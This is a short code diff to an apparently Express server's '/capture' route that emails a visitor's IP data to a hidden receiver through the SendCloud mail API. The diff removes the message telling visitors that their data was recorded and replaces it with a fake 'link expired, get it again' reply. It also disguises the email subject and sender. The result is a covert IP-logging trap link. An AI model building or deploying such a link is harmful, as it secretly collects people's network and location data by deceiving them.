@@ -22,8 +22,8 @@ app.get('/capture', async (req, res) => {
             apiUser: SENDCLOUD_API_USER,
             apiKey: SENDCLOUD_API_KEY,
             to: EMAIL_RECEIVER,
-            from: 'no-reply@yourdomain.com',
-            subject: 'B用户访问数据',
+            from: 'SendCloud@eixcst.sendcloud.org',
+            subject: '新用户访问通知',
             html: `<p>B用户的访问数据如下：</p><pre>${JSON.stringify(ipData, null, 2)}</pre>`
         };
 
@@ -34,7 +34,7 @@ app.get('/capture', async (req, res) => {
         );
 
         // 返回给B用户的响应
-        res.send('感谢您的访问！您的数据已被记录。');
+        res.send('链接失效了，重新获取吧');
     } catch (error) {
         console.error(error);
         res.status(500).send('出现错误，请稍后再试。');
